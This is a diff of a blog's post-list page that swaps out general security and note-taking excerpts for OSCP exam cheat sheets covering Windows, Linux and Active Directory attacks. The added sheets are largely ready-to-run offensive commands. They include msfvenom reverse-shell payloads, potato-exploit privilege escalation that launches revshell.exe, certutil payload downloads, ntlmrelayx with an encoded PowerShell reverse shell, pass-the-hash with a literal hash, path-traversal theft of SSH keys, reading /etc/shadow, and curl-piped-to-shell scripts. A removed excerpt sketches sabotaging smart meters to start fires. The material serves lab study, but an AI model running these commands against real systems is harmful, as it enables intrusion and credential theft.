@@ -150,7 +150,7 @@
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/notes---asd-annual-cyber-threat-report-2023-2024/">Notes - ASD Annual Cyber Threat Report 2023-2024</a>
+          <a href="/posts/oscp---cheat-sheet---active-directory/">OSCP - Cheat Sheet - Active Directory</a>
         </h2>
         <div class="post-meta"></div>
 
@@ -159,48 +159,7 @@
             
             #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
             
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <p>Reference: <a href="https://www.cyber.gov.au/about-us/view-all-content/reports-and-statistics/annual-cyber-threat-report-2023-2024">https://www.cyber.gov.au/about-us/view-all-content/reports-and-statistics/annual-cyber-threat-report-2023-2024</a></p>
-<hr>
-<h1 id="executive-summary">Executive Summary</h1>
-<p>State-sponsored cyber actors persistently targeting Australian government, critical infrastructure, and businesses using evolving tradecraft. (Espionage, malign influence, interference and coercion)</p>
-<ul>
-<li>Chinese state actors leveraging LOTL, behaviour consistent with pre-positioning for disruption</li>
-<li>Russia adapting techniques including cloud platform exploitation.</li>
-<li>Critical infrastructure is an attractive target, making up 11% of ASD incident responses</li>
-<li>Cybercrime is persistent and disruptive, and adapting to capitalise on AI.</li>
-</ul>
-<h1 id="year-in-review">Year In Review</h1>
-<p>Top 3 self-reported business crimes</p>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/notes---asd-annual-cyber-threat-report-2023-2024/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="/posts/notes---brief-history--ethos-of-the-digital-garden/">Notes - Brief History &amp; Ethos of the Digital Garden</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/knowledge-management/">knowledge-management</a>&nbsp;
-            
-            #<a href="/tags/creativity/">creativity</a>&nbsp;
+            #<a href="/tags/oscp/">oscp</a>&nbsp;
             
           </span>
         
@@ -210,140 +169,82 @@
 
         <div class="post-content">
           
-            <p>Reference: <a href="https://maggieappleton.com/garden-history">https://maggieappleton.com/garden-history</a></p>
-<hr>
-<h1 id="brief-history--ethos-of-the-digital-garden">Brief History &amp; Ethos of the Digital Garden</h1>
-<p>Avoiding &ldquo;personal blog&rdquo; and more like free-form work-in-progress wikis
-A collection of evolving ideas not organised by publication
-Half-finished thoughts that grow and evolve with time
-&ldquo;Less perfect&rdquo; - like the early days of the web</p>
+            <p><a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology">HackTricks - AD Methodology</a></p>
+<h1 id="initial-access">Initial Access</h1>
 <ul>
-<li>WikiGardeners <a href="https://wiki.c2.com/?WikiGardener">https://wiki.c2.com/?WikiGardener</a> and WikiGnomes - <a href="https://wiki.c2.com/?WikiGnome">https://wiki.c2.com/?WikiGnome</a>
-<a href="https://www.youtube.com/watch?v=ckv_CjyKyZY&amp;feature=emb_logo">Mike Caulfield</a> coining the term <a href="https://hapgood.us/2015/10/17/the-garden-and-the-stream-a-technopastoral/">&ldquo;Digital Gardening&rdquo;</a>
-&ldquo;Campfires&rdquo; as conversational spaces to exchange still-forming ideas
-Joel Hooks <a href="https://hapgood.us/2015/10/17/the-garden-and-the-stream-a-technopastoral/">&ldquo;My blog is a digital garden&rdquo;</a>
-Amy Hoy&rsquo;s <a href="https://stackingthebricks.com/how-blogs-broke-the-web/">&ldquo;How the Blog Broke the Web</a></li>
-</ul>
-<p><code>Is GitHub you digital garden? A space to share ideas, work, files, ect in a semi-structured manner?</code></p>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/notes---brief-history--ethos-of-the-digital-garden/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="/posts/notes---burning-down-cities/">Notes - Burning Down Cities</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
-            
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <hr>
-<p><em>Target System</em>: IoT/IIoT device C2 via next-gen smart meteres with customer-facing wifi</p>
+<li><code>whoami</code>, <code>whoami /all</code></li>
+<li><code>whoami /priv</code>
 <ul>
-<li>Other pathways: Smart inverters &amp; utility scale battery storage</li>
-</ul>
-<p><em>The Attack</em>
-Utilise known vulnerability to cause catastrophic failure &amp; fire</p>
+<li>SeImpersonatePrivilege
 <ul>
-<li>Requires &lt;5% success rate
-<img src="/images/Pasted%20image%2020250426144202.png" alt="Pasted Image 20250426144202">
-Foreign actors buying up 3rd party generation with direct connection to FEPS
-Legacy systems and lack of patching are the issue here</li>
-</ul>
-<p>Centralised control is the heart of the attack</p>
+<li>Run <a href="https://github.com/CCob/SweetPotato">SweetPotato</a>
 <ul>
-<li>Near future: control system which can communicate to all IoT systems in a house</li>
-<li>Near future: Edge computing on the side of people&rsquo;s houses with direct &amp; unrestricted connection to the internet</li>
-</ul>
-<p>Devices</p>
-          
-        </div>
-
-        
-           <div>
-            <a class="read-more button inline" href="/posts/notes---burning-down-cities/">[Read more]</a>
-          </div>
-        
-      </article>
-    
-      <article class="post on-list">
-        <h2 class="post-title">
-          <a href="/posts/notes---i-took-the-worlds-hardest-cybersecurity-exam-cissp/">Notes - I Took The World’s HARDEST Cybersecurity Exam (CISSP)</a>
-        </h2>
-        <div class="post-meta"></div>
-
-        
-          <span class="post-tags">
-            
-            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
-            
-            #<a href="/tags/cissp/">cissp</a>&nbsp;
-            
-          </span>
-        
-
-        
-
-
-        <div class="post-content">
-          
-            <p>Reference: Original: <a href="https://www.youtube.com/watch?v=9BZaim2uQn0">https://www.youtube.com/watch?v=9BZaim2uQn0</a></p>
-<hr>
-<p>4 hour exam, up to 175 questions but adaptive (can cut off at 125)
-Recommend Study</p>
-<ul>
-<li><a href="https://www.youtube.com/watch?v=_nyZhYnCNLA">Pete Zerger&rsquo;s 8 hour CISSP Exam Cram</a> - 4 days watching video
-<ul>
-<li>Split up domains, watched 2 per day at 1.25x speed, took notes throughout, then practice tests on just those two domains</li>
+<li><code>./sweetpotato.exe -a &quot;C:\Users\Public\revshell.exe&quot;</code></li>
 </ul>
 </li>
-<li><a href="https://www.amazon.com.au/Certified-Information-Security-Professional-Official-ebook/dp/B097NHJK9Q/">Official Study Guide </a>
-<ul>
-<li>Includes multiple practice tests and full length exams
-Exam Questions - 3 days (~3000 questions)</li>
+<li><a href="https://github.com/itm4n/FullPowers">FullPowers tool</a></li>
+<li><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">How to use potatoes</a> &amp; - <a href="https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/privileges-abuse/seimpersonate/potatoes" title="Pre-compiled">Pre-compiled Potatoes</a></li>
+<li><a href="https://juggernaut-sec.com/seimpersonateprivilege/">How to use Juicy/Rogue Potato &amp; Printspoofer</a></li>
+<li><a href="https://github.com/itm4n/PrintSpoofer">Printspoofer - GitHub</a> <code>.\PrintSpoofer64.exe -i -c powershell.exe</code> <code>whoami</code></li>
+<li><a href="https://github.com/k4sth4/Juicy-Potato/tree/main">Juicy Potato - Github</a> <code>.\juicypotato.exe -l  -p c:\Users\tony\revshell.exe -t * -c &quot;{9E175B9C-F52A-11D8-B9A5-505054503030}&quot;</code></li>
 </ul>
 </li>
-<li><a href="https://www.boson.com/practice-exam/cissp-isc2-practice-exam">ExSim-Max for CISSP</a> Practice Exams - $75 for 700 questions</li>
-<li><a href="https://www.pocketprep.com/exams/isc2-cissp/">PocketPrep</a> - $25 for 1000 questions</li>
+<li>SEbackupPriv
+<ul>
+<li><a href="https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/">https://exploit-notes.hdks.org/exploit/windows/privilege-escalation/windows-privesc-with-sebackupprivilege/</a></li>
+<li><a href="https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md">https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md</a></li>
 </ul>
-<p>Questions are as vague as people say</p>
+</li>
+<li>SeShutdownPrivilege
+<ul>
+<li>Can a startup process be modified? Then modify &amp; reboot</li>
+<li>Check service has <code>Auto</code>: `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like &lsquo;httpd&rsquo;}</li>
+<li>Reboot: <code>shutdown /r /t 0</code></li>
+</ul>
+</li>
+<li><a href="https://github.com/xct/SeManageVolumeAbuse">SeManageVolumePrivilege</a>
+<ul>
+<li><code>wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe</code></li>
+<li></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><code>whoami /groups</code>,
+<ul>
+<li><code>net localgroup</code> or <code>Get-LocalGroup</code> (Existing groups)</li>
+<li><code>Get-LocalGroupMember groupname</code> (Inspect)</li>
+</ul>
+</li>
+<li><code>systeminfo</code> (wiki build number)
+<ul>
+<li>Windows kernel exploits</li>
+</ul>
+</li>
+</ul>
+<p>More Initial Access</p>
           
         </div>
 
         
            <div>
-            <a class="read-more button inline" href="/posts/notes---i-took-the-worlds-hardest-cybersecurity-exam-cissp/">[Read more]</a>
+            <a class="read-more button inline" href="/posts/oscp---cheat-sheet---active-directory/">[Read more]</a>
           </div>
         
       </article>
     
       <article class="post on-list">
         <h2 class="post-title">
-          <a href="/posts/notes---notebooklm-with-obsidian/">Notes - NotebookLM with Obsidian</a>
+          <a href="/posts/oscp---cheat-sheet---core/">OSCP - Cheat Sheet - Core</a>
         </h2>
         <div class="post-meta"></div>
 
         
           <span class="post-tags">
             
-            #<a href="/tags/knowledge-management/">knowledge-management</a>&nbsp;
+            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+            
+            #<a href="/tags/oscp/">oscp</a>&nbsp;
             
           </span>
         
@@ -353,28 +254,281 @@ Exam Questions - 3 days (~3000 questions)</li>
 
         <div class="post-content">
           
-            <hr>
-<p>Notebook LM accepts Markdown
-Notebook LM does not use personal data to train the model</p>
-<p>Research and Execution</p>
+            <h1 id="pre-exam">Pre-Exam</h1>
 <ul>
-<li>Sources - Import your notes, youtube videos, audio files</li>
-<li>Save Notes so you can keep output</li>
-<li>Convert to Source if you want to use output as a source later</li>
-<li>Copy &amp; Paste conversation back into Obsidian (tag with <code>containsAI</code>)</li>
-<li>Output an audio overview - listen while on a walk</li>
+<li>Download the resources from the dedicated lab clients;</li>
+<li>Document your report as you go during the exam</li>
+<li>Do a practice exam!</li>
 </ul>
-<p>Personal Plan</p>
+<h1 id="setup">Setup</h1>
+<p>Create directories: <code>mkdir dc host1 host2</code></p>
 <ul>
-<li>Bring in a bundle of sources that interest you, then ask questions</li>
+<li>Create sub directories: <code>mkdir enu loot files exploits</code>
+Setup hostnames: <code>sudo nano /etc/hosts</code> then add host/kali IPs</li>
 </ul>
-<p>Social Media Generator</p>
+<h1 id="quick-reference">Quick Reference</h1>
+<ul>
+<li><code>sudo nmap -T5 -p- -v host1 -oN enu/host1.nmap</code></li>
+<li><code>sudo nmap -T5 -p80,443,1978-1980 -sCV -v host1 -oN enu/nmap-services.nmap</code></li>
+<li><code>gobuster dir -u http://host1 -w /usr/share/dirb/wordlists/common.txt | tee gobuster-p80.nmap</code></li>
+<li><code>usr/share/wordlists/rockyou.txt</code></li>
+<li><code>usr/share/wordlists/SecLists</code></li>
+<li><code>nc -nvlp 4444</code> <a href="https://gist.github.com/cmbaughman/c91f41ba7b2cf71106f1">NetCat Cheat Sheet</a></li>
+<li><a href="https://www.revshells.com/">https://www.revshells.com/</a></li>
+</ul>
+<h1 id="easy-wins">Easy wins</h1>
+<ul>
+<li>Linux: Capabilities, SUIDs/GUIDs, cronjobs, modifiable binaries running as root, out-of-date binaries, known-binary exploits, history files.</li>
+<li>Windows: Weak service permissions, Unquoted service paths, outdated binaries, scheduled tasks, custom</li>
+<li>Take breaks, and set timers: If you&rsquo;re not getting anywhere for more than half an hour, take a break. Get some fresh air, and you&rsquo;ll almost definitely think of a new idea.
+<ul>
+<li>Similarly, celebrate when you make progress! If you finish a machine its a good time for a rest</li>
+</ul>
+</li>
+<li>Regularly review the information you have for a machine - key services, known version numbers, and any known credentials.</li>
+<li>Document as you go - take screenshots of key moments in the machine, and of course when you read a proof file.</li>
+<li>Metasploit - pick the machine that you think you have the least chance of exploiting manually</li>
+</ul>
+<h1 id="general-tips">General Tips</h1>
+<ul>
+<li>xfreerdp can pass the hash to login</li>
+<li><code>runas /user:domain\username cmd.exe</code> (or rdp and open CMD as admin)</li>
+<li>Use the Kali directory: <strong>/usr/share/webshells</strong> for all your payloads.</li>
+<li>MSFVenom Shell code for Buffer Overflow <a href="https://www.offsec.com/metasploit-unleashed/alphanumeric-shellcode/">https://www.offsec.com/metasploit-unleashed/alphanumeric-shellcode/</a></li>
+<li>If it&rsquo;s running SSH, find/replace the id_rsa</li>
+<li><code>!/bin/bash</code></li>
+<li>SMB - <code>crackmapexec</code> show available shares: <code>crackmapexec smb 192.168.50.242 -u john -p &quot;dqsTwTpZPn#nL&quot; --shares</code></li>
+<li>Scanning UDP Ports for SNMP - <a href="https://infosecwriteups.com/why-you-should-always-scan-udp-ports-part-1-2-d8ee7eb26727">https://infosecwriteups.com/why-you-should-always-scan-udp-ports-part-1-2-d8ee7eb26727</a></li>
+</ul>
+<p><img src="https://johnjhacking.com/uploads/autonmap.png" alt=""></p>
           
         </div>
 
         
            <div>
-            <a class="read-more button inline" href="/posts/notes---notebooklm-with-obsidian/">[Read more]</a>
+            <a class="read-more button inline" href="/posts/oscp---cheat-sheet---core/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
+          <a href="/posts/oscp---cheat-sheet---linux/">OSCP - Cheat Sheet - Linux</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+            
+            #<a href="/tags/oscp/">oscp</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="initial-access">Initial Access</h1>
+<p>Launch Netcat Listener: <code>nc -nvlp 1234</code>
+Launch HTML server: `python3 -m http.server 80
+Launch Python Virtual Environment:</p>
+<ul>
+<li><code>cd ~/py</code></li>
+<li>`python3 -m venv venv</li>
+<li><code>source bin/activate Run enum4linux-ng: </code>enum4linux-ng -A 192.168.x.x<code>Run enum4linux:</code>enum4linux 192.168.x.x` (Run both tools)</li>
+</ul>
+<h1 id="privesc">PrivEsc</h1>
+<h2 id="upgrade-shell">Upgrade Shell</h2>
+<ul>
+<li>`/usr/bin/script -qc /bin/bash /dev/null</li>
+<li>`python3 -c &lsquo;import pty; pty.spawn(&quot;/bin/bash&quot;)&rsquo;</li>
+<li>`python3 -c &ldquo;import pty; pty.spawn(&rsquo;/bin/sh&rsquo;)&rdquo;</li>
+<li><code>/bin/sh -i</code> | <code>/bin/bash -i</code> | <code>echo 'os.system('/bin/bash')'</code></li>
+<li><code>perl -e 'exec &quot;/bin/sh&quot;;'</code></li>
+<li>To escape rbash
+<ul>
+<li><code>ssh user@ip -t &quot;bash --noprofile&quot;</code></li>
+<li><code>export PATH=$PATH:/usr/local/sbin:/usr/localsbin:/usr/sbin:/usr/bin:/sbin:/bin</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="enumerate">Enumerate</h2>
+<ul>
+<li><code>find / -name local.txt -type f 2&gt;/dev/null</code></li>
+<li><code>id</code></li>
+<li><code>cat /etc/passwd</code> | <code>cat /etc/shadow</code> | <code>cat /root/.ssh</code></li>
+<li><code>hostname</code>, <code>cat /etc/issue</code>,<code>cat /etc/os-release</code>, <code>uname -a</code></li>
+<li><code>/home/andrew/.bash_history</code></li>
+<li><code>sudo -l</code> &ndash;&gt; check <a href="https://gtfobins.github.io/">GTFOBins</a></li>
+<li><code>crontab -l</code></li>
+<li><code>su root:root</code>, <code>su andrew:andrew</code>, <code>su andrew:(NOPASS)</code>, <code>sudo -i</code> (reqs root password)</li>
+<li><code>ls /var/mail</code> | <code>ls /var/spool/mail</code></li>
+<li><code>/usr/sbin/getcap -r / 2&gt;/dev/null</code></li>
+<li><a href="https://vk9-sec.com/disk-group-privilege-escalation/?source=post_page-----9aaa071b5989--------------------------------">If member of Disk Group</a>
+<ul>
+<li><code>df -h</code> (find OS) | <code>debugfs /dva/OS</code> | <code>/etc/shadow</code> <code>/root/.ssh</code></li>
+</ul>
+</li>
+<li>Binaries
+<ul>
+<li><code>find / -perm -4000 2&gt;/dev/null</code></li>
+<li><code>find / -perm -u=s -type f 2&gt;/dev/null -printf &quot;%f\n&quot;</code>
+<ul>
+<li><code>ls -lah</code> &amp; check <a href="https://gtfobins.github.io/">GTFObins</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Processes:
+<ul>
+<li><code>ps -eaf</code></li>
+<li>Watch processes:<code>watch -n 1 &quot;ps -aux | grep pass&quot;</code></li>
+<li>Pspy: <a href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32">https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32</a>
+<ul>
+<li><code>wget $kaliIP/pspy32</code></li>
+<li><code>chmod +x pspy32</code> &amp; <code>timeout 2m ./pspy32</code></li>
+</ul>
+</li>
+<li>If root is regularly running a writable script: <code>echo &quot;chmod +s /bin/bash&quot; &gt;&gt; script.sh</code> then <code>/bin/bash -p</code></li>
+</ul>
+</li>
+<li>Enumeration Scripts:
+<ul>
+<li><a href="https://github.com/etc5had0w/suider/blob/main/suider.sh">SUIDer</a>: <code>wget -L https://github.com/etc5had0w/suider/blob/main/suider.sh</code></li>
+<li><a href="https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS">LinPeas</a>: <code>curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh</code></li>
+<li><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></li>
+<li>Kali Pre-installed <code>unix-privesc-check</code></li>
+<li><a href="https://github.com/mzet-/linux-exploit-suggester">Linux Exploit Suggester</a> <code>https://github.com/The-Z-Labs/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh</code></li>
+<li><a href="https://github.com/diego-treitos/linux-smart-enumeration">Linux Smart Enumeration</a> <code>wget https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="exploit">Exploit</h2>
+<ul>
+<li>RSA key on Linux server: <code>curl http://192.168.XX.XXX/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/username/.ssh/id_rsa</code></li>
+</ul>
+<h1 id="random---to-sort">Random - To Sort</h1>
+<ul>
+<li>
+<p><code>exiftool -a -u file.pdf</code> (metadata inspector)</p>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/oscp---cheat-sheet---linux/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
+          <a href="/posts/oscp---cheat-sheet---windows/">OSCP - Cheat Sheet - Windows</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+            
+            #<a href="/tags/oscp/">oscp</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="quick-reference">Quick Reference</h1>
+<ul>
+<li><code>dir /s/b local.txt</code> - Usually <code>C:\</code> or <code>C:\users\username\desktop\</code></li>
+<li><code>dir /s/b proof.txt</code> - Usually <code>C:\Users\Administrator\Desktop\</code></li>
+<li><code>dir /s/b *.txt</code></li>
+<li>RDP: <code>xfreerdp /u:username /p:password /v:192.168.x.x /cert:ignore</code></li>
+<li>RevShell.exe: <code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=4444 -f exe -o revshell.exe</code></li>
+<li>Compile C: <code>/usr/bin/x86_64-w64-mingw32-gcc cfile.c -o output.exe</code></li>
+<li>Compile C#: <code>msbuild projectname.csproj</code></li>
+<li>Transfer to Windows host: <code>certutil -split -urlcache -f http://192.168.x.x/revshell.exe C:\\Users\\username\\revshell.exe</code></li>
+<li>Fix Broken Path: <code>set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;</code></li>
+<li>Windows Exploit Suggester: <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></li>
+</ul>
+<h1 id="port-enumeration-from-kali">Port Enumeration (from Kali)</h1>
+<ul>
+<li><strong>HTTP/WebDav (80)</strong>: <code>cadaver 192.168.</code>
+<ul>
+<li>Run <code>put /usr/share/webshells/aspx/cmdasp.aspx</code> to upload command shell, then access via browser</li>
+</ul>
+</li>
+<li><strong>Kerberos (88)</strong>: <code>kerbrute userenum -d domain.name --dc 192.168. users</code></li>
+<li><strong>SMB (139/445)</strong>: <code>sudo nmap --script smb-vuln* -p 139,445 192.168.</code>
+<ul>
+<li><code>smbclient -U user \\\\192.168.</code></li>
+<li><code>impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.xx.xxx -c &quot;powershell -enc JABjAGwAaQBlAG4AdA...&quot;</code> (base64 powershell one-liner)
+<ul>
+<li>Kali: Call fake directory <code>dir \\192.168.xx.xxx\fake</code> for reverse shell</li>
+</ul>
+</li>
+<li>Pass the Hash: <code>smbclient \\\\192.168.xx.xxx\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b</code></li>
+</ul>
+</li>
+<li><strong>LDAP (389)</strong>: <code>sudo nmap -n -sV -Pn -script 'ldap* and not brute' 192.168.</code>
+<ul>
+<li>Domain Name found (LDAP Search): <code>ldapsearch -v -x -b 'DC=domain,DC=name' -H 'ldap://192.168.' '(objectclass=*)'</code></li>
+<li>Use credentials to find admin password <code>ldapsearch -x -H 'ldap://192.168.x.x' -D 'domain\user' -w 'userpassword' -b 'dc=domain,dc=name' &quot;(ms-MCS-AdmPwd=*)&quot; ms-MCS-AdmPwd</code>
+<ul>
+<li>To Login <code>psexec.py domain.name/administrator: 'adminpassword'@192.168.x.x</code> to login</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="impacket">Impacket</h1>
+<p>Psexec.py - <code>/usr/share/doc/python3-impacket/examples/psexec.py</code>
+<code>impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.xx.xxx</code></p>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/oscp---cheat-sheet---windows/">[Read more]</a>
+          </div>
+        
+      </article>
+    
+      <article class="post on-list">
+        <h2 class="post-title">
+          <a href="/posts/oscp---clue---linux/">OSCP - Clue - Linux</a>
+        </h2>
+        <div class="post-meta"></div>
+
+        
+          <span class="post-tags">
+            
+            #<a href="/tags/cyber-security/">cyber-security</a>&nbsp;
+            
+          </span>
+        
+
+        
+
+
+        <div class="post-content">
+          
+            <h1 id="clue">Clue</h1>
+<p>This was definitely a hard box, but the biggest challenges came from the range of different services AND the box itself not working properly. After a couple of hours bashing my head against the brick wall trying to get initial access, I finally relented and looked at a walkthrough&hellip; only to find that the <code>cassandra</code> exploit I&rsquo;d tried to use to display files on the target hadn&rsquo;t worked because the box needed to be reverted.</p>
+          
+        </div>
+
+        
+           <div>
+            <a class="read-more button inline" href="/posts/oscp---clue---linux/">[Read more]</a>
           </div>
         
       </article>
